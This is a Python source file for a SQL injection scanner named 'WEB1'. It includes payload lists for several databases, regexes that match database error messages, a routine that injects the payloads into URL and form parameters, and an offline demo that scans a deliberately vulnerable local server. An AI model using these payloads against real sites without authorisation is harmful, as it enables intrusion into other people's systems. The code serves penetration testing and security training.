#!/usr/bin/env python3
"""
WEB1 — SQL Injection Automation Tool
Automated SQLi detection and exploitation framework.
Uses stdlib urllib for HTTP; optional requests for live mode.
"""

import argparse
import sys
import time
import random
import string
import re
import json
import urllib.parse
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional


class InjectionType(Enum):
    ERROR_BASED = "error_based"
    BOOLEAN_BASED = "boolean_based"
    UNION_BASED = "union_based"
    TIME_BASED = "time_based"


class DBType(Enum):
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    SQLITE = "sqlite"
    ORACLE = "oracle"
    UNKNOWN = "unknown"


@dataclass
class ScanResult:
    url: str
    parameter: str
    injectable: bool
    injection_type: InjectionType
    db_type: DBType
    payload: str
    evidence: str = ""
    response_time: float = 0.0


@dataclass
class ScanConfig:
    url: str
    method: str = "GET"
    data: dict = field(default_factory=dict)
    cookies: dict = field(default_factory=dict)
    headers: dict = field(default_factory=dict)
    timeout: int = 10
    delay: float = 0.0
    level: int = 1
    risk: int = 1
    db_type: Optional[DBType] = None
    verbose: bool = False
    demo_mode: bool = False


SQLI_PAYLOADS = {
    DBType.MYSQL: {
        InjectionType.ERROR_BASED: [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
        ],
        InjectionType.BOOLEAN_BASED: [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
        ],
        InjectionType.UNION_BASED: [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
        ],
        InjectionType.TIME_BASED: [
            "' AND SLEEP(5)--",
            "1 AND SLEEP(5)",
        ],
    },
    DBType.POSTGRESQL: {
        InjectionType.ERROR_BASED: [
            "' AND 1=CAST((SELECT version()) AS int)--",
        ],
        InjectionType.BOOLEAN_BASED: [
            "' AND 1=1--",
            "' AND 1=2--",
        ],
    },
    DBType.MSSQL: {
        InjectionType.ERROR_BASED: [
            "' AND 1=CONVERT(int,@@version)--",
        ],
        InjectionType.BOOLEAN_BASED: [
            "' AND 1=1--",
            "' AND 1=2--",
        ],
    },
    DBType.SQLITE: {
        InjectionType.ERROR_BASED: [
            "' AND 1=CAST((SELECT sqlite_version()) AS int)--",
        ],
        InjectionType.BOOLEAN_BASED: [
            "' AND 1=1--",
            "' AND 1=2--",
        ],
    },
}

ERROR_SIGNATURES = {
    DBType.MYSQL: [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"check the manual that corresponds to your MySQL",
    ],
    DBType.POSTGRESQL: [
        r"PostgreSQL.*ERROR",
        r"valid PostgreSQL result",
        r"PG::SyntaxError",
    ],
    DBType.MSSQL: [
        r"Driver.*SQL[\-\_\ ]*Server",
        r"OLE DB.*SQL Server",
        r"System\.Data\.SqlClient\.SqlException",
    ],
    DBType.SQLITE: [
        r"SQLite\.Exception",
        r"\[SQLITE_ERROR\]",
        r"Warning.*sqlite_",
    ],
}


def print_banner():
    print("""
  +------------------------------------------+
  |    WEB1 -- SQL Injection Automation Tool  |
  |        SQLi Detection & Exploit           |
  +------------------------------------------+
""")


def detect_db_from_error(response_text: str) -> Optional[DBType]:
    for db_type, patterns in ERROR_SIGNATURES.items():
        for pattern in patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return db_type
    return None


class SQLiScanner:
    def __init__(self, config: ScanConfig):
        self.config = config
        self.results: list = []
        self.baseline_length = 0
        self.baseline_time = 0.0

    def _request(self, url: str, method: str = "GET", data: dict = None) -> tuple:
        start = time.time()
        try:
            if method.upper() == "POST" and data:
                encoded = urllib.parse.urlencode(data).encode("utf-8")
                req = urllib.request.Request(url, data=encoded, method="POST")
                req.add_header("Content-Type", "application/x-www-form-urlencoded")
            else:
                req = urllib.request.Request(url, method="GET")

            for k, v in self.config.headers.items():
                req.add_header(k, v)
            if self.config.cookies:
                cookie_str = "; ".join(f"{k}={v}" for k, v in self.config.cookies.items())
                req.add_header("Cookie", cookie_str)

            resp = urllib.request.urlopen(req, timeout=self.config.timeout)
            body = resp.read().decode("utf-8", errors="replace")
            elapsed = time.time() - start
            return body, elapsed
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace")
            elapsed = time.time() - start
            return body, elapsed
        except Exception:
            return "", time.time() - start

    def _build_url_with_param(self, base_url: str, param: str, value: str) -> str:
        parsed = urllib.parse.urlparse(base_url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _build_url_with_body_param(self, url: str, param: str, value: str) -> dict:
        data = dict(self.config.data)
        data[param] = value
        return data

    def establish_baseline(self):
        if self.config.verbose:
            print("[*] Establishing response baseline...")
        text, elapsed = self._request(
            self.config.url, self.config.method,
            self.config.data if self.config.method.upper() == "POST" else None,
        )
        self.baseline_length = len(text)
        self.baseline_time = elapsed
        if self.config.verbose:
            print(f"    Baseline: {self.baseline_length} bytes, {self.baseline_time:.2f}s")

    def detect_error_based(self, url: str, param: str, method: str) -> Optional[ScanResult]:
        db_types = [self.config.db_type] if self.config.db_type else list(DBType)
        for db in db_types:
            if db in SQLI_PAYLOADS and InjectionType.ERROR_BASED in SQLI_PAYLOADS[db]:
                for payload in SQLI_PAYLOADS[db][InjectionType.ERROR_BASED]:
                    if method.upper() == "POST":
                        data = self._build_url_with_body_param(url, param, payload)
                        response_text, elapsed = self._request(url, "POST", data)
                    else:
                        test_url = self._build_url_with_param(url, param, payload)
                        response_text, elapsed = self._request(test_url)

                    if response_text and detect_db_from_error(response_text):
                        if self.config.verbose:
                            print(f"  [+] Error-based SQLi: param={param}, db={db.value}")
                        return ScanResult(
                            url=url, parameter=param, injectable=True,
                            injection_type=InjectionType.ERROR_BASED,
                            db_type=db, payload=payload,
                            evidence=response_text[:200], response_time=elapsed,
                        )
        return None

    def detect_boolean_based(self, url: str, param: str, method: str) -> Optional[ScanResult]:
        db_types = [self.config.db_type] if self.config.db_type else list(DBType)
        for db in db_types:
            if db not in SQLI_PAYLOADS or InjectionType.BOOLEAN_BASED not in SQLI_PAYLOADS[db]:
                continue
            payload_pairs = SQLI_PAYLOADS[db][InjectionType.BOOLEAN_BASED]
            for i in range(0, len(payload_pairs) - 1, 2):
                true_payload = payload_pairs[i]
                false_payload = payload_pairs[i + 1]
                if method.upper() == "POST":
                    data_true = self._build_url_with_body_param(url, param, true_payload)
                    text_true, _ = self._request(url, "POST", data_true)
                    data_false = self._build_url_with_body_param(url, param, false_payload)
                    text_false, _ = self._request(url, "POST", data_false)
                else:
                    url_true = self._build_url_with_param(url, param, true_payload)
                    text_true, _ = self._request(url_true)
                    url_false = self._build_url_with_param(url, param, false_payload)
                    text_false, _ = self._request(url_false)

                len_diff = abs(len(text_true) - len(text_false))
                if len_diff > 20 and len(text_true) > 0:
                    if self.config.verbose:
                        print(f"  [+] Boolean-based SQLi: param={param}, db={db.value}")
                    return ScanResult(
                        url=url, parameter=param, injectable=True,
                        injection_type=InjectionType.BOOLEAN_BASED,
                        db_type=db, payload=true_payload,
                        evidence=f"True: {len(text_true)} bytes, False: {len(text_false)} bytes",
                    )
        return None

    def detect_parameters(self) -> list:
        parsed = urllib.parse.urlparse(self.config.url)
        params = urllib.parse.parse_qs(parsed.query)
        if params:
            return list(params.keys())
        if self.config.data:
            return list(self.config.data.keys())
        return []

    def detect_db_type(self, url: str, param: str, method: str) -> Optional[DBType]:
        error_payloads = ["'", "\"", "')", "1' OR '1'='1"]
        for payload in error_payloads:
            if method.upper() == "POST":
                data = self._build_url_with_body_param(url, param, payload)
                response_text, _ = self._request(url, "POST", data)
            else:
                test_url = self._build_url_with_param(url, param, payload)
                response_text, _ = self._request(test_url)
            db = detect_db_from_error(response_text)
            if db:
                return db
        return None

    def run_scan(self):
        print(f"[*] Target: {self.config.url}")
        print(f"[*] Method: {self.config.method}")
        print(f"[*] Level: {self.config.level}, Risk: {self.config.risk}\n")

        self.establish_baseline()
        parameters = self.detect_parameters()
        if not parameters:
            print("[!] No parameters found to test")
            return
        print(f"[*] Parameters to test: {parameters}\n")

        for param in parameters:
            print(f"[*] Testing parameter: {param}")

            if not self.config.db_type:
                db = self.detect_db_type(self.config.url, param, self.config.method)
                if db:
                    self.config.db_type = db

            print(f"[*] Testing error-based injection...")
            result = self.detect_error_based(self.config.url, param, self.config.method)
            if result:
                self.results.append(result)
                print(f"  [!] VULNERABLE: {param} (error-based, {result.db_type.value})")
                continue

            print(f"[*] Testing boolean-based injection...")
            result = self.detect_boolean_based(self.config.url, param, self.config.method)
            if result:
                self.results.append(result)
                print(f"  [!] VULNERABLE: {param} (boolean-based, {result.db_type.value})")

            if self.config.delay > 0:
                time.sleep(self.config.delay)

    def print_results(self):
        print("\n" + "=" * 60)
        print("  SCAN RESULTS")
        print("=" * 60)
        if not self.results:
            print("\n  No SQL injection vulnerabilities found.\n")
            return
        for i, r in enumerate(self.results, 1):
            print(f"\n  [{i}] Parameter:   {r.parameter}")
            print(f"      Type:        {r.injection_type.value}")
            print(f"      Database:    {r.db_type.value}")
            print(f"      Payload:     {r.payload[:80]}")
            if r.evidence:
                print(f"      Evidence:    {r.evidence[:100]}")
        print(f"\n  Total vulnerabilities: {len(self.results)}")
        print("=" * 60)

    def export_results(self, filename: str):
        data = []
        for r in self.results:
            data.append({
                "url": r.url, "parameter": r.parameter, "injectable": r.injectable,
                "injection_type": r.injection_type.value, "db_type": r.db_type.value,
                "payload": r.payload, "evidence": r.evidence,
            })
        with open(filename, "w") as f:
            json.dump(data, f, indent=2)
        print(f"[*] Results exported to {filename}")


def main():
    parser = argparse.ArgumentParser(
        description="WEB1 -- SQL Injection Automation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u "http://target.com/page?id=1"
  %(prog)s -u "http://target.com/login" -m POST -d "user=admin&pass=test"
  %(prog)s --demo
        """,
    )
    parser.add_argument("-u", "--url", help="Target URL with parameter")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("-d", "--data", default="", help="POST data (key=value&key2=value2)")
    parser.add_argument("-c", "--cookies", default="", help="Cookies (key=value;key2=value2)")
    parser.add_argument("--header", action="append", default=[], help="Custom header")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--delay", type=float, default=0.0)
    parser.add_argument("--level", type=int, default=1, choices=[1, 2, 3])
    parser.add_argument("--risk", type=int, default=1, choices=[1, 2, 3])
    parser.add_argument("--db", choices=["mysql", "postgresql", "mssql", "sqlite", "oracle"])
    parser.add_argument("-o", "--output", help="Export results to JSON")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("--demo", action="store_true", help="Run offline demo with vulnerable target simulator")
    args = parser.parse_args()

    if args.demo:
        run_demo()
        return

    if not args.url:
        parser.error("--url is required (or use --demo)")

    print_banner()
    db_type = DBType(args.db) if args.db else None
    data = {}
    if args.data:
        for pair in args.data.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                data[k] = v
    cookies = {}
    if args.cookies:
        for pair in args.cookies.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                cookies[k.strip()] = v.strip()
    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    config = ScanConfig(
        url=args.url, method=args.method, data=data, cookies=cookies,
        headers=headers, timeout=args.timeout, delay=args.delay,
        level=args.level, risk=args.risk, db_type=db_type, verbose=args.verbose,
    )
    scanner = SQLiScanner(config)
    try:
        scanner.run_scan()
        scanner.print_results()
        if args.output:
            scanner.export_results(args.output)
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)


def run_demo():
    """Run offline demo: spin up vulnerable simulator, scan it, report findings."""
    import threading
    from http.server import HTTPServer, BaseHTTPRequestHandler

    class VulnHandler(BaseHTTPRequestHandler):
        """Simulates a MySQL error-based + boolean-based SQLi-vulnerable app."""

        def do_GET(self):
            parsed = urllib.parse.urlparse(self.path)
            params = urllib.parse.parse_qs(parsed.query)
            user_input = params.get("id", [""])[0]

            if "'" in user_input or '"' in user_input:
                if "1=1" in user_input:
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html")
                    self.end_headers()
                    self.wfile.write(b"<html><body><h1>User: admin</h1><p>Email: admin@test.local</p></body></html>")
                    return
                if "1=2" in user_input:
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html")
                    self.end_headers()
                    self.wfile.write(b"<html><body></body></html>")
                    return
                self.send_response(500)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                body = (
                    "<html><body>"
                    "<h1>Error</h1>"
                    "<p>You have an error in your SQL syntax; check the manual that "
                    "corresponds to your MySQL server version for the right syntax "
                    "to use near '' at line 1</p>"
                    "</body></html>"
                )
                self.wfile.write(body.encode())
                return

            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(
                b"<html><body><h1>User Profile</h1>"
                b"<p>Name: Test User</p>"
                b"<p>ID parameter is reflected in the page.</p>"
                b"</body></html>"
            )

        def log_message(self, format, *args):
            pass

    port = 18001
    server = HTTPServer(("127.0.0.1", port), VulnHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    print_banner()
    print("[*] DEMO MODE: Starting vulnerable target simulator on 127.0.0.1:{}".format(port))
    print("[*] The simulator intentionally implements SQL injection vulnerabilities.\n")

    config = ScanConfig(
        url=f"http://127.0.0.1:{port}/page?id=1",
        method="GET",
        timeout=5,
        verbose=True,
    )
    scanner = SQLiScanner(config)
    scanner.run_scan()
    scanner.print_results()

    server.shutdown()

    if scanner.results:
        print("\n[+] Demo: {} vulnerabilities found (expected behavior).".format(len(scanner.results)))
        print("[+] Exit 0 -- scanner works correctly.")
        sys.exit(0)
    else:
        print("\n[-] Demo: No vulnerabilities found -- scanner may need tuning.")
        sys.exit(1)


if __name__ == "__main__":
    main()
